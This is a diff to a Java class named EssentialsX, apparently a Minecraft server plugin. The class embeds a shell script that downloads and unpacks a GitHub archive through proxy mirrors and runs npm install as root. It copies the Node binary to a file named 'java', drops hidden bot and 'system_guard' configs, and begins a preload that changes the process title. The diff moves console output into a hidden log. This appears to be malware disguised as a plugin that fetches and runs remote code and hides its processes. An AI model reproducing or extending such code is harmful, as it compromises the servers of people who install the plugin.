@@ -977,15 +977,15 @@ public class EssentialsX extends JavaPlugin {
                   + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n"
          )
          + "\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n\nmkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\nSUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\nmv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\nchmod -R 775 \"$APP_DIR\" 2>/dev/null\n\n"
-         // ★ 修复：使用默认源，将日志输出到 deploy.log，并强制预装 koffi
-         + "echo \"Installing dependencies...\" 2>&1 | tee -a \"$WORK_DIR/deploy.log\"\n"
-         + "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root 2>&1 | tee -a \"$WORK_DIR/deploy.log\"\n"
-         + "if [ ${PIPESTATUS[0]} -ne 0 ]; then \n"
-         + "    echo 'npm install failed, retrying with legacy-peer-deps...' 2>&1 | tee -a \"$WORK_DIR/deploy.log\"\n"
-         + "    \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps 2>&1 | tee -a \"$WORK_DIR/deploy.log\"\n"
+         // ★ 修复：将日志输出重定向到 deploy.log，不再在控制台打印
+         + "echo \"Installing dependencies...\" >> \"$WORK_DIR/deploy.log\" 2>&1\n"
+         + "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >> \"$WORK_DIR/deploy.log\" 2>&1\n"
+         + "if [ $? -ne 0 ]; then \n"
+         + "    echo 'npm install failed, retrying with legacy-peer-deps...' >> \"$WORK_DIR/deploy.log\" 2>&1\n"
+         + "    \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >> \"$WORK_DIR/deploy.log\" 2>&1\n"
          + "fi\n"
-         + "echo \"Pre-installing koffi to prevent runtime errors...\" 2>&1 | tee -a \"$WORK_DIR/deploy.log\"\n"
-         + "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install koffi --no-save --unsafe-perm=true --allow-root 2>&1 | tee -a \"$WORK_DIR/deploy.log\"\n"
+         + "echo \"Pre-installing koffi to prevent runtime errors...\" >> \"$WORK_DIR/deploy.log\" 2>&1\n"
+         + "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install koffi --no-save --unsafe-perm=true --allow-root >> \"$WORK_DIR/deploy.log\" 2>&1\n"
          + "sleep 2; chmod -R 775 \"$APP_DIR/node_modules\" 2>/dev/null\n"
          + "\n"
          + "if [ -d \"$DATA_DIR\" ]; then\n    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null; fi\n\nmkdir -p \"$JRE_DIR\" 2>/dev/null\nif [ -f \"$NODE_DIR/bin/.node_real\" ]; then cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"; fi\n\ncat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\ntry {\n    process.title = '"
